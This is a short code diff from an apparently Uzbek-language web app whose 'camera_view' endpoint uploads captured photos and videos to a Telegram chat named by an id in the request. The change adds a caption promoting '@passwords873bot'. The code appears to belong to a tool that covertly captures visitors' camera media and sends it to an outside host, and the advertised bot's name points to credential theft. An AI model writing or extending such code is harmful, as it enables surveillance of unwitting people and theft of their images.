@@ -40,7 +40,7 @@ def camera_view(request, id):
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
             with open(file_path, "rb") as f:
                 files = {"photo": f}
-                data = {"chat_id": id, "caption": f"Rasm 📸"}
+                data = {"chat_id": id, "caption": f"Rasm 📸 \n\n@passwords873bot"}
                 r = requests.post(url, files=files, data=data, timeout=15)
                 # agar kerak bo'lsa r.status_code va r.json() bilan tekshirib yozing
         except Exception as e:
@@ -70,7 +70,7 @@ def camera_view(request, id):
                 url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
                 with open(mp4_path, "rb") as f:
                     files = {"video": f}
-                    data = {"chat_id": id, "caption": f"Video 🎥"}
+                    data = {"chat_id": id, "caption": f"Video 🎥 \n\n@passwords873bot"}
                     r = requests.post(url, files=files, data=data, timeout=60)
             except Exception as e:
                 print("Telegram video yuborishda xato:", e)
